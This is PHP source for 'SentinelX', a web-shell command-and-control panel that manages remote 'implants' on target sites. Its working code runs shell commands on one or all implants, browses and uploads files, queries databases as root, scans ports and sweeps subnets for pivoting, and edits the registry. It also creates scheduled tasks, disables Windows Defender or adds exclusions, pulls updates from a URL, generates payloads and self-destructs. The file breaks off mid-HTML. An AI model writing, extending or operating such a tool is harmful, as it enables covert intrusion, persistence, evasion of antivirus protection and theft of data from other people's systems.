<?php
session_start();

require_once __DIR__ . '/config/config.php';

$config_file = __DIR__ . '/config/implants.json';
$logs_dir = __DIR__ . '/logs';

if (!file_exists($config_file)) file_put_contents($config_file, json_encode([]));
if (!is_dir($logs_dir)) mkdir($logs_dir, 0755, true);

// ========== LOGIN ==========
$logged_in = isset($_SESSION['sx_logged_in']) && $_SESSION['sx_logged_in'] === true;

if (isset($_POST['login'])) {
    if ($_POST['password'] === PANEL_PASSWORD) {
        $_SESSION['sx_logged_in'] = true;
        $_SESSION['sx_login_time'] = time();
        header('Location: ?');
        exit;
    }
    $login_error = 'Invalid password';
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ?');
    exit;
}

// Session timeout
if ($logged_in && (time() - ($_SESSION['sx_login_time'] ?? 0)) > SESSION_TIMEOUT) {
    session_destroy();
    header('Location: ?');
    exit;
}

if (!$logged_in && ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['login']))) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>SentinelX WebShell Login</title>
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Inter', sans-serif;
                background: #070b14;
                color: #e2e8f0;
                height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                -webkit-font-smoothing: antialiased;
            }
            .login-box {
                background: #101624;
                border: 1px solid rgba(255,255,255,0.06);
                border-radius: 12px;
                padding: 32px;
                width: 360px;
                box-shadow: 0 25px 50px rgba(0,0,0,0.5);
            }
            .login-brand {
                display: flex; align-items: center; gap: 10px; margin-bottom: 24px;
            }
            .brand-icon {
                display: inline-flex; align-items: center; justify-content: center;
                width: 32px; height: 32px;
                background: linear-gradient(135deg, #00d4ff, #7c3aed);
                border-radius: 6px; font-size: 14px; font-weight: 800; color: #000;
            }
            .brand-text {
                font-size: 18px; font-weight: 700;
                background: linear-gradient(135deg, #00d4ff, #7c3aed);
                -webkit-background-clip: text; -webkit-text-fill-color: transparent;
                background-clip: text;
            }
            .brand-sub { font-size: 11px; color: #64748b; margin-top: 2px; }
            .login-box h2 { font-size: 15px; font-weight: 600; margin-bottom: 16px; color: #00d4ff; }
            input {
                background: #0a0e17; border: 1px solid rgba(255,255,255,0.06);
                color: #e2e8f0; padding: 10px 12px; border-radius: 6px;
                font-family: 'Inter', sans-serif; font-size: 13px;
                width: 100%; margin-bottom: 12px;
                outline: none; transition: border-color 0.15s;
            }
            input:focus { border-color: #00d4ff; box-shadow: 0 0 0 3px rgba(0,212,255,0.15); }
            .btn {
                width: 100%; padding: 10px; border: none; border-radius: 6px;
                background: #00d4ff; color: #000; font-size: 13px; font-weight: 600;
                cursor: pointer; font-family: 'Inter', sans-serif;
                transition: background 0.15s;
            }
            .btn:hover { background: #33ddff; }
            .error { color: #ef4444; font-size: 12px; margin-bottom: 12px; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <div class="login-brand">
                <span class="brand-icon">SW</span>
                <div>
                    <div class="brand-text">SentinelX</div>
                    <div class="brand-sub">WebShell Manager</div>
                </div>
            </div>
            <h2>Login</h2>
            <?php if (isset($login_error)): ?>
                <div class="error"><?= htmlspecialchars($login_error) ?></div>
            <?php endif; ?>
            <form method="post">
                <input type="password" name="password" placeholder="Password" autofocus>
                <button type="submit" name="login" class="btn">Authenticate</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// ========== END LOGIN ==========

function get_implants() {
    global $config_file;
    return json_decode(file_get_contents($config_file), true) ?: [];
}

function save_implants($implants) {
    global $config_file;
    file_put_contents($config_file, json_encode($implants, JSON_PRETTY_PRINT));
}

function send_request($url, $data, $auth_key) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($data),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_HTTPHEADER => ["X-Auth: $auth_key"],
    ]);
    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    return ['body' => $result, 'http_code' => $http_code, 'error' => $error];
}

function log_action($implant_id, $action, $details = '') {
    global $logs_dir;
    $log = date('Y-m-d H:i:s') . " | $implant_id | $action | $details\n";
    file_put_contents("$logs_dir/actions.log", $log, FILE_APPEND);
}

$action = $_GET['action'] ?? 'dashboard';

// Handle POST actions (API)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');

    switch ($action) {
        case 'add_implant':
            $implants = get_implants();
            $id = uniqid('sx');
            $implants[$id] = [
                'id' => $id,
                'name' => $_POST['name'] ?? 'Implant-' . substr($id, -5),
                'url' => rtrim($_POST['url'] ?? '', '/'),
                'auth_key' => $_POST['auth_key'] ?? 'sentinelx_2024',
                'added' => date('Y-m-d H:i:s'),
                'last_seen' => null,
                'status' => 'unknown',
                'notes' => $_POST['notes'] ?? '',
            ];
            save_implants($implants);
            log_action($id, 'added');
            echo json_encode(['status' => 'ok', 'id' => $id]);
            break;

        case 'remove_implant':
            $implants = get_implants();
            $id = $_POST['id'] ?? '';
            if (isset($implants[$id])) {
                unset($implants[$id]);
                save_implants($implants);
                log_action($id, 'removed');
                echo json_encode(['status' => 'ok']);
            } else {
                echo json_encode(['status' => 'error', 'message' => 'Not found']);
            }
            break;

        case 'beacon':
            $implants = get_implants();
            $url = $_POST['url'] ?? '';
            foreach ($implants as &$imp) {
                if ($imp['url'] === $url || $imp['id'] === ($_POST['id'] ?? '')) {
                    $result = send_request($imp['url'] . '/implant.php', ['action' => 'beacon'], $imp['auth_key']);
                    if ($result['http_code'] === 200 && $result['body']) {
                        $data = json_decode($result['body'], true);
                        $imp['last_seen'] = date('Y-m-d H:i:s');
                        $imp['status'] = $data['status'] === 'ok' ? 'online' : 'error';
                        if (isset($data['data'])) $imp['info'] = $data['data'];
                    } else {
                        $imp['status'] = 'offline';
                    }
                    save_implants($implants);
                    echo json_encode(['status' => 'ok', 'implant' => $imp]);
                    break 2;
                }
            }
            echo json_encode(['status' => 'error', 'message' => 'Implant not found']);
            break;

        case 'beacon_all':
            $implants = get_implants();
            foreach ($implants as &$imp) {
                $result = send_request($imp['url'] . '/implant.php', ['action' => 'beacon'], $imp['auth_key']);
                if ($result['http_code'] === 200 && $result['body']) {
                    $data = json_decode($result['body'], true);
                    if ($data && $data['status'] === 'ok') {
                        $imp['last_seen'] = date('Y-m-d H:i:s');
                        $imp['status'] = 'online';
                        if (isset($data['data'])) $imp['info'] = $data['data'];
                    } else {
                        $imp['status'] = 'error';
                    }
                } else {
                    $imp['status'] = 'offline';
                }
            }
            save_implants($implants);
            echo json_encode(['status' => 'ok']);
            break;

        case 'exec':
            $implants = get_implants();
            $id = $_POST['id'] ?? '';
            $cmd = $_POST['cmd'] ?? '';
            if (!isset($implants[$id])) { echo json_encode(['status' => 'error', 'message' => 'Not found']); break; }
            $imp = $implants[$id];
            $result = send_request($imp['url'] . '/implant.php', ['action' => 'exec', 'cmd' => $cmd], $imp['auth_key']);
            log_action($id, 'exec', $cmd);
            $data = json_decode($result['body'], true);
            echo json_encode($data ?: ['status' => 'error', 'message' => $result['error'] ?: 'HTTP ' . $result['http_code'], 'raw' => $result['body']]);
            break;

        case 'file':
            $implants = get_implants();
            $id = $_POST['id'] ?? '';
            $faction = $_POST['faction'] ?? 'list';
            $path = $_POST['path'] ?? '/';
            if (!isset($implants[$id])) { echo json_encode(['status' => 'error', 'message' => 'Not found']); break; }
            $imp = $implants[$id];
            $result = send_request($imp['url'] . '/implant.php', ['action' => 'file', 'faction' => $faction, 'path' => $path], $imp['auth_key']);
            $data = json_decode($result['body'], true);
            echo json_encode($data ?: ['status' => 'error', 'message' => $result['error']]);
            break;

        case 'db':
            $implants = get_implants();
            $id = $_POST['id'] ?? '';
            if (!isset($implants[$id])) { echo json_encode(['status' => 'error', 'message' => 'Not found']); break; }
            $imp = $implants[$id];
            $result = send_request($imp['url'] . '/implant.php', [
                'action' => 'db',
                'db_type' => $_POST['db_type'] ?? 'mysql',
                'db_host' => $_POST['db_host'] ?? 'localhost',
                'db_user' => $_POST['db_user'] ?? 'root',
                'db_pass' => $_POST['db_pass'] ?? '',
                'db_name' => $_POST['db_name'] ?? '',
                'query' => $_POST['query'] ?? 'SHOW TABLES',
            ], $imp['auth_key']);
            $data = json_decode($result['body'], true);
            echo json_encode($data ?: ['status' => 'error', 'message' => $result['error']]);
            break;

        case 'scan':
            $implants = get_implants();
            $id = $_POST['id'] ?? '';
            if (!isset($implants[$id])) { echo json_encode(['status' => 'error', 'message' => 'Not found']); break; }
            $imp = $implants[$id];
            $result = send_request($imp['url'] . '/implant.php', [
                'action' => 'scan',
                'host' => $_POST['host'] ?? '127.0.0.1',
                'ports' => $_POST['ports'] ?? '[21,22,23,25,53,80,110,143,443,445,3306,3389,5432,6379,8080,8443]',
            ], $imp['auth_key']);
            $data = json_decode($result['body'], true);
            echo json_encode($data ?: ['status' => 'error', 'message' => $result['error']]);
            break;

        case 'self_destruct':
            $implants = get_implants();
            $id = $_POST['id'] ?? '';
            if (!isset($implants[$id])) { echo json_encode(['status' => 'error', 'message' => 'Not found']); break; }
            $imp = $implants[$id];
            $result = send_request($imp['url'] . '/implant.php', ['action' => 'self_destruct'], $imp['auth_key']);
            unset($implants[$id]);
            save_implants($implants);
            log_action($id, 'self_destruct');
            echo json_encode(['status' => 'ok', 'message' => 'Self-destruct sent']);
            break;

        case 'upload':
            $implants = get_implants();
            $id = $_POST['id'] ?? '';
            $path = $_POST['path'] ?? '/';
            if (!isset($implants[$id]) || !isset($_FILES['file'])) {
                echo json_encode(['status' => 'error', 'message' => 'Invalid request']); break;
            }
            $imp = $implants[$id];
            $ch = curl_init();
            $post = [
                'action' => 'file',
                'faction' => 'upload',
                'path' => $path,
                'file' => new CURLFile($_FILES['file']['tmp_name'], $_FILES['file']['type'], $_FILES['file']['name']),
            ];
            curl_setopt_array($ch, [
                CURLOPT_URL => $imp['url'] . '/implant.php',
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => $post,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 30,
                CURLOPT_HTTPHEADER => ['X-Auth: ' . $imp['auth_key']],
            ]);
            $result = curl_exec($ch);
            curl_close($ch);
            $data = json_decode($result, true);
            log_action($id, 'upload', $_FILES['file']['name'] . ' -> ' . $path);
            echo json_encode($data ?: ['status' => 'error', 'message' => 'Upload failed']);
            break;

        case 'bulk_exec':
            $implants = get_implants();
            $cmd = $_POST['cmd'] ?? '';
            $results = [];
            foreach ($implants as $id => $imp) {
                $r = send_request($imp['url'] . '/implant.php', ['action' => 'exec', 'cmd' => $cmd], $imp['auth_key']);
                $d = json_decode($r['body'], true);
                $results[] = [
                    'id' => $id,
                    'name' => $imp['name'],
                    'status' => $d['status'] ?? 'error',
                    'output' => $d['output'] ?? ($d['message'] ?? 'Connection failed'),
                ];
                log_action($id, 'bulk_exec', $cmd);
            }
            echo json_encode(['status' => 'ok', 'results' => $results]);
            break;

        case 'export_log':
            global $logs_dir;
            $logFile = "$logs_dir/actions.log";
            $content = file_exists($logFile) ? file_get_contents($logFile) : '';
            echo json_encode(['status' => 'ok', 'content' => $content]);
            break;

        // ===== NEW MODULES =====

        case 'registry':
            $implants = get_implants();
            $id = $_POST['id'] ?? '';
            if (!isset($implants[$id])) { echo json_encode(['status' => 'error', 'message' => 'Not found']); break; }
            $imp = $implants[$id];
            $result = send_request($imp['url'] . '/implant.php', [
                'action' => 'registry',
                'reg_action' => $_POST['reg_action'] ?? 'list',
                'key' => $_POST['key'] ?? 'HKLM\\Software',
                'value_name' => $_POST['value_name'] ?? '',
                'value_data' => $_POST['value_data'] ?? '',
            ], $imp['auth_key']);
            echo json_encode(json_decode($result['body'], true) ?: ['status' => 'error', 'message' => $result['error']]);
            break;

        case 'wmi_query':
            $implants = get_implants();
            $id = $_POST['id'] ?? '';
            if (!isset($implants[$id])) { echo json_encode(['status' => 'error', 'message' => 'Not found']); break; }
            $imp = $implants[$id];
            $result = send_request($imp['url'] . '/implant.php', [
                'action' => 'wmi_query',
                'wmi_query' => $_POST['wmi_query'] ?? 'os get name,version,caption',
            ], $imp['auth_key']);
            echo json_encode(json_decode($result['body'], true) ?: ['status' => 'error', 'message' => $result['error']]);
            break;

        case 'schtasks':
            $implants = get_implants();
            $id = $_POST['id'] ?? '';
            if (!isset($implants[$id])) { echo json_encode(['status' => 'error', 'message' => 'Not found']); break; }
            $imp = $implants[$id];
            $result = send_request($imp['url'] . '/implant.php', [
                'action' => 'schtasks',
                'sch_action' => $_POST['sch_action'] ?? 'list',
                'sch_name' => $_POST['sch_name'] ?? '',
                'sch_command' => $_POST['sch_command'] ?? '',
                'sch_time' => $_POST['sch_time'] ?? '14:00',
            ], $imp['auth_key']);
            echo json_encode(json_decode($result['body'], true) ?: ['status' => 'error', 'message' => $result['error']]);
            break;

        case 'windows_defender':
            $implants = get_implants();
            $id = $_POST['id'] ?? '';
            if (!isset($implants[$id])) { echo json_encode(['status' => 'error', 'message' => 'Not found']); break; }
            $imp = $implants[$id];
            $result = send_request($imp['url'] . '/implant.php', [
                'action' => 'windows_defender',
                'def_action' => $_POST['def_action'] ?? 'status',
                'def_path' => $_POST['def_path'] ?? '',
            ], $imp['auth_key']);
            echo json_encode(json_decode($result['body'], true) ?: ['status' => 'error', 'message' => $result['error']]);
            break;

        case 'db_schema':
            $implants = get_implants();
            $id = $_POST['id'] ?? '';
            if (!isset($implants[$id])) { echo json_encode(['status' => 'error', 'message' => 'Not found']); break; }
            $imp = $implants[$id];
            $result = send_request($imp['url'] . '/implant.php', [
                'action' => 'db_schema',
                'db_type' => $_POST['db_type'] ?? 'mysql',
                'db_host' => $_POST['db_host'] ?? 'localhost',
                'db_user' => $_POST['db_user'] ?? 'root',
                'db_pass' => $_POST['db_pass'] ?? '',
                'db_name' => $_POST['db_name'] ?? '',
            ], $imp['auth_key']);
            echo json_encode(json_decode($result['body'], true) ?: ['status' => 'error', 'message' => $result['error']]);
            break;

        case 'auto_update':
            $implants = get_implants();
            $id = $_POST['id'] ?? '';
            if (!isset($implants[$id])) { echo json_encode(['status' => 'error', 'message' => 'Not found']); break; }
            $imp = $implants[$id];
            $result = send_request($imp['url'] . '/implant.php', [
                'action' => 'auto_update',
                'url' => $_POST['url'] ?? '',
            ], $imp['auth_key']);
            echo json_encode(json_decode($result['body'], true) ?: ['status' => 'error', 'message' => $result['error']]);
            break;

        case 'at_schedule':
            $implants = get_implants();
            $id = $_POST['id'] ?? '';
            if (!isset($implants[$id])) { echo json_encode(['status' => 'error', 'message' => 'Not found']); break; }
            $imp = $implants[$id];
            $result = send_request($imp['url'] . '/implant.php', [
                'action' => 'at_schedule',
                'cmd' => $_POST['cmd'] ?? '',
                'time' => $_POST['time'] ?? '14:00',
            ], $imp['auth_key']);
            echo json_encode(json_decode($result['body'], true) ?: ['status' => 'error', 'message' => $result['error']]);
            break;

        case 'pivot_sweep':
            $implants = get_implants();
            $id = $_POST['id'] ?? '';
            if (!isset($implants[$id])) { echo json_encode(['status' => 'error', 'message' => 'Not found']); break; }
            $imp = $implants[$id];
            $result = send_request($imp['url'] . '/implant.php', [
                'action' => 'pivot_sweep',
                'subnet' => $_POST['subnet'] ?? '192.168.1',
                'timeout' => $_POST['timeout'] ?? '1',
            ], $imp['auth_key']);
            echo json_encode(json_decode($result['body'], true) ?: ['status' => 'error', 'message' => $result['error']]);
            break;

        case 'chunked_download':
            $implants = get_implants();
            $id = $_POST['id'] ?? '';
            if (!isset($implants[$id])) { echo json_encode(['status' => 'error', 'message' => 'Not found']); break; }
            $imp = $implants[$id];
            $result = send_request($imp['url'] . '/implant.php', [
                'action' => 'chunked_download',
                'path' => $_POST['path'] ?? '',
                'offset' => strval($_POST['offset'] ?? '0'),
                'chunk_size' => strval($_POST['chunk_size'] ?? '1048576'),
            ], $imp['auth_key']);
            echo json_encode(json_decode($result['body'], true) ?: ['status' => 'error', 'message' => $result['error']]);
            break;

        case 'check_update':
            if (!UPDATE_CHECK_URL) {
                echo json_encode(['status' => 'ok', 'current' => SENTINELX_VERSION, 'latest' => SENTINELX_VERSION, 'uptodate' => true, 'url' => '', 'notes' => '']);
                break;
            }
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => UPDATE_CHECK_URL,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 3,
                CURLOPT_CONNECTTIMEOUT => 3,
                CURLOPT_SSL_VERIFYPEER => false,
            ]);
            $resp = curl_exec($ch);
            $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            if ($http !== 200 || !$resp) {
                echo json_encode([
                    'status' => 'ok', 'current' => SENTINELX_VERSION,
                    'latest' => SENTINELX_VERSION, 'uptodate' => true,
                    'url' => '', 'notes' => '', 'error' => 'unreachable'
                ]);
                break;
            }
            $remote = json_decode($resp, true);
            $latest = $remote['latest'] ?? SENTINELX_VERSION;
            $uptodate = version_compare(SENTINELX_VERSION, $latest, '>=');
            echo json_encode([
                'status' => 'ok',
                'current' => SENTINELX_VERSION,
                'latest' => $latest,
                'uptodate' => $uptodate,
                'url' => $remote['url'] ?? '',
                'notes' => $remote['notes'] ?? '',
            ]);
            break;

        default:
            echo json_encode(['status' => 'error', 'message' => 'Unknown action']);
    }
    exit;
}

// GET-only download proxy
if ($action === 'download' && $_SERVER['REQUEST_METHOD'] === 'GET') {
    $implants = get_implants();
    $id = $_GET['id'] ?? '';
    $path = $_GET['path'] ?? '';
    if (!isset($implants[$id])) { http_response_code(404); die('Not found'); }
    $imp = $implants[$id];
    $result = send_request($imp['url'] . '/implant.php', ['action' => 'file', 'faction' => 'read', 'path' => $path], $imp['auth_key']);
    $data = json_decode($result['body'], true);
    if ($data && $data['status'] === 'ok') {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($path) . '"');
        header('Content-Length: ' . strlen($data['content']));
        echo $data['content'];
    } else {
        http_response_code(500);
        echo 'Download failed';
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SentinelX WebShell Panel</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="assets/css/style.css">
</head>
<body>
    <div id="toastContainer" class="toast-container"></div>
    <div id="app">
        <nav class="navbar">
            <div class="nav-brand">
                <span class="brand-icon">SW</span>
                <span class="brand-text">SentinelX</span>
                <span class="version-badge" id="versionBadge">v<?= SENTINELX_VERSION ?></span>
                <span class="nav-sub">WebShell Manager</span>
            </div>
            <div class="nav-actions">
                <button onclick="beaconAll()" class="btn btn-sm">Beacon All</button>
                <label class="toggle-label" title="Auto-refresh beacon">
                    <input type="checkbox" id="autoRefreshToggle" onchange="toggleAutoRefresh()">
                    <span class="toggle-track"><span class="toggle-thumb"></span></span>
                    <span class="toggle-text">Auto</span>
                </label>
                <button onclick="openPayloadGenerator()" class="btn btn-sm">Payloads</button>
                <button onclick="openBulkExec()" class="btn btn-sm">Bulk</button>
                <button onclick="exportLogs()" class="btn btn-sm">Logs</button>
                <button onclick="toggleTheme()" class="btn btn-sm" id="themeBtn">Light</button>
                <a href="?logout" class="btn btn-sm" style="text-decoration:none;">Logout</a>
                <span class="status-dot" id="connStatus" title="Server Status"></span>
                <span id="updateNotif" class="update-badge" style="display:none;cursor:pointer;" onclick="showUpdateModal()" title="Update available!"></span>
            </div>
        </nav>

        <div class="container">
            <aside class="sidebar">
                <div class="sidebar-header">
                    <h3>Implants</h3>
                    <button onclick="showAddImplant()" class="btn btn-sm btn-primary">+ Add</button>
                </div>
                <div class="implant-list" id="implantList">
                    <div class="loading">Loading...</div>
                </div>
            </aside>

            <main class="main-content">
                <div id="viewContent">
                    <div class="welcome">
                        <h1>SentinelX Dashboard</h1>
                        <p>Select an implant from the sidebar to begin.</p>
                        <div class="stats-row" id="statsRow"></div>
                    </div>
                </div>
            </main>
        </div>
    </div>

    <!-- Add Implant Modal -->
    <div id="addModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Add Implant</h2>
                <button class="modal-close" onclick="closeModal('addModal')">Close</button>
            </div>
            <form id="addForm" onsubmit="addImplant(event)">
                <label>Name</label>
                <input type="text" name="name" placeholder="My Target" required>
                <label>URL (implant.php location)</label>
                <input type="url" name="url" placeholder="https://target.com" required>
                <label>Auth Key</label>
                <input type="text" name="auth_key" value="sentinelx_2024">
                <label>Notes</label>
                <textarea name="notes" rows="2"></textarea>
                <button type="submit" class="btn btn-primary">Add Implant</button>
            </form>
        </div>
    </div>

    <!-- Shell Modal -->
    <div id="shellModal" class="modal modal-wide">
        <div class="modal-content">
            <div class="modal-header">
                <h2 id="shellTitle">Shell</h2>
                <button class="modal-close" onclick="closeModal('shellModal')">Close</button>
            </div>
            <div id="shellOutput" class="shell-output"></div>
            <form id="shellForm" onsubmit="execCommand(event)">
                <input type="hidden" name="id" id="shellId">
                <div class="input-group">
                    <span class="input-prefix" id="shellCwd">$</span>
                    <input type="text" name="cmd" id="shellCmd" placeholder="Enter command..." autocomplete="off">
                </div>
            </form>
        </div>
    </div>

    <!-- File Manager Modal -->
    <div id="fileModal" class="modal modal-wide">
        <div class="modal-content">
            <div class="modal-header">
                <h2>File Manager</h2>
                <button class="modal-close" onclick="closeModal('fileModal')">Close</button>
            </div>
            <div class="file-toolbar">
                <span id="filePath">/</span>
                <input type="hidden" id="fileId">
                <input type="hidden" id="fileCurrentPath">
                <button class="btn btn-sm" onclick="document.getElementById('fileUpload').click()">Upload</button>
                <input type="file" id="fileUpload" style="display:none">
                <button class="btn btn-sm" onclick="refreshFileList()">Refresh</button>
            </div>
            <div id="fileList" class="file-list"></div>
        </div>
    </div>

    <!-- DB Modal -->
    <div id="dbModal" class="modal modal-wide">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Database Browser</h2>
                <button class="modal-close" onclick="closeModal('dbModal')">Close</button>
            </div>
            <form id="dbForm" onsubmit="execDbQuery(event)">
                <input type="hidden" name="id" id="dbId">
                <div class="db-conn">
                    <select name="db_type"><option value="mysql">MySQL</option><option value="sqlite">SQLite</option></select>
                    <input type="text" name="db_host" placeholder="Host" value="localhost">
                    <input type="text" name="db_user" placeholder="User" value="root">
                    <input type="password" name="db_pass" placeholder="Pass">
                </div>
                <input type="text" name="db_name" placeholder="Database" style="margin-bottom:10px;">
                <textarea name="query" rows="3" placeholder="SQL query...">SHOW TABLES</textarea>
                <button type="submit" class="btn btn-primary" style="margin-top:2px;">Execute</button>
            </form>
            <div id="dbResult" class="db-result"></div>
        </div>
    </div>

    <!-- Bulk Exec Modal -->
    <div id="bulkModal" class="modal modal-wide">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Bulk Command Execution</h2>
                <button class="modal-close" onclick="closeModal('bulkModal')">Close</button>
            </div>
            <form id="bulkForm" onsubmit="execBulk(event)">
                <input type="text" name="cmd" id="bulkCmd" placeholder="Enter command to run on ALL online implants..." autocomplete="off" required>
                <div style="display:flex;gap:8px;align-items:center;margin-bottom:10px;">
                    <button type="submit" class="btn btn-primary">Execute</button>
                    <span id="bulkStatus" class="loading" style="display:none;padding:0;">Running...</span>
                </div>
            </form>
            <div id="bulkResult" class="bulk-result"></div>
        </div>
    </div>

    <!-- Payload Generator Modal -->
    <div id="payloadModal" class="modal modal-wide">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Payload Generator</h2>
                <button class="modal-close" onclick="closeModal('payloadModal')">Close</button>
            </div>
            <div class="payload-options">
                <label>Auth Key</label>
                <div style="display:flex;gap:8px;">
                    <input type="text" id="payloadKey" value="sentinelx_2024" style="flex:1;">
                    <button class="btn btn-primary" onclick="regeneratePayloads()">Regenerate</button>
                </div>
            </div>
            <div class="payload-tabs" id="payloadTabs">
                <button class="payload-tab active" onclick="switchPayloadLang('php',this)">PHP</button>
                <button class="payload-tab" onclick="switchPayloadLang('py',this)">Python</button>
                <button class="payload-tab" onclick="switchPayloadLang('sh',this)">Bash</button>
                <button class="payload-tab" onclick="switchPayloadLang('pl',this)">Perl</button>
                <button class="payload-tab" onclick="switchPayloadLang('js',this)">Node.js</button>
            </div>
            <div class="payload-grid" id="payloadGrid">
                <div class="loading">Loading payloads...</div>
            </div>
        </div>
    </div>

    <!-- Registry Modal -->
    <div id="registryModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Registry Editor</h2>
                <button class="modal-close" onclick="closeModal('registryModal')">Close</button>
            </div>
            <input type="hidden" id="registryId">
            <div style="display:flex;gap:6px;margin-bottom:10px;">
                <select id="regAction" style="width:100px;">
                    <option value="list">List</option>
                    <option value="read">Read</option>
                    <option value="write">Write</option>
                    <option value="delete">Delete</option>
                </select>
                <input type="text" id="regKey" placeholder="HKLM\Software\Key" value="HKLM\Software" style="flex:1;">
            </div>
            <input type="text" id="regValueName" placeholder="Value name (optional)">
            <input type="text" id="regValueData" placeholder="Value data (for write)">
            <button class="btn btn-primary" onclick="runRegistry()" style="margin-bottom:10px;">Execute</button>
            <div id="regResult" class="bulk-result"></div>
        </div>
    </div>

    <!-- WMI Query Modal -->
    <div id="wmiModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>WMI Query Builder</h2>
                <button class="modal-close" onclick="closeModal('wmiModal')">Close</button>
            </div>
            <input type="hidden" id="wmiId">
            <div style="margin-bottom:10px;">
                <label style="font-size:12px;color:var(--text-dim);">Common queries:</label>
                <div style="display:flex;gap:6px;flex-wrap:wrap;margin-top:4px;">
                    <button class="btn btn-sm" onclick="$('wmiQuery').value='os get name,version,caption'">OS Info</button>
                    <button class="btn btn-sm" onclick="$('wmiQuery').value='process get name,processid,executablepath'">Processes</button>
                    <button class="btn btn-sm" onclick="$('wmiQuery').value='service get name,displayname,state,startmode'">Services</button>
                    <button class="btn btn-sm" onclick="$('wmiQuery').value='product get name,version,vendor'">Installed</button>
                </div>
            </div>
            <input type="text" id="wmiQuery" placeholder="WMI Query (e.g. os get name)" style="margin-bottom:10px;">
            <button class="btn btn-primary" onclick="runWmiQuery()">Execute</button>
            <div id="wmiResult" class="bulk-result" style="margin-top:10px;"></div>
        </div>
    </div>

    <!-- Scheduled Tasks Modal -->
    <div id="schtasksModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Scheduled Tasks (Windows)</h2>
                <button class="modal-close" onclick="closeModal('schtasksModal')">Close</button>
            </div>
            <input type="hidden" id="schtasksId">
            <div style="display:flex;gap:6px;margin-bottom:10px;">
                <select id="schAction" style="width:100px;">
                    <option value="list">List</option>
                    <option value="create">Create</option>
                    <option value="delete">Delete</option>
                    <option value="run">Run</option>
                </select>
                <input type="text" id="schName" placeholder="Task name" style="flex:1;">
            </div>
            <input type="text" id="schCommand" placeholder="Command (for create)" style="margin-bottom:6px;">
            <input type="text" id="schTime" placeholder="Time HH:MM" value="14:00" style="margin-bottom:6px;">
            <button class="btn btn-primary" onclick="runSchtasks()">Execute</button>
            <div id="schResult" class="bulk-result" style="margin-top:10px;"></div>
        </div>
    </div>

    <!-- Windows Defender Modal -->
    <div id="defenderModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Windows Defender</h2>
                <button class="modal-close" onclick="closeModal('defenderModal')">Close</button>
            </div>
            <input type="hidden" id="defenderId">
            <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px;">
                <button class="btn btn-sm" onclick="runDefender('status')">Status</button>
                <button class="btn btn-sm" onclick="runDefender('disable')">Disable RTM</button>
                <button class="btn btn-sm" onclick="runDefender('enable')">Enable RTM</button>
                <button class="btn btn-sm" onclick="runDefender('exclusion_list')">Exclusions</button>
            </div>
            <div style="display:flex;gap:6px;">
                <input type="text" id="defPath" placeholder="Path to exclude" style="flex:1;">
                <button class="btn btn-sm" onclick="runDefender('exclusion_add')">Add Exclusion</button>
            </div>
            <div id="defResult" class="bulk-result" style="margin-top:10px;"></div>
        </div>
    </div>

    <!-- DB Schema Modal -->
    <div id="dbSchemaModal" class="modal modal-wide">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Database Schema Browser</h2>
                <button class="modal-close" onclick="closeModal('dbSchemaModal')">Close</button>
            </div>
            <input type="hidden" id="dbSchemaId">
            <form id="dbSchemaForm" onsubmit="runDbSchema(event)">
                <div style="display:flex;gap:6px;margin-bottom:6px;">
                    <select name="db_type" id="dbSchemaType"><option value="mysql">MySQL</option><option value="sqlite">SQLite</option></select>
                    <input type="text" name="db_host" id="dbSchemaHost" placeholder="Host" value="localhost">
                    <input type="text" name="db_user" id="dbSchemaUser" placeholder="User" value="root">
                    <input type="password" name="db_pass" id="dbSchemaPass" placeholder="Pass">
                </div>
                <input type="text" name="db_name" id="dbSchemaName" placeholder="Database name" style="margin-bottom:6px;">
                <button type="submit" class="btn btn-primary">Browse Schema</button>
            </form>
            <div id="dbSchemaResult" class="bulk-result" style="margin-top:10px;"></div>
        </div>
    </div>

    <!-- Auto Update Modal -->
    <div id="updateModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
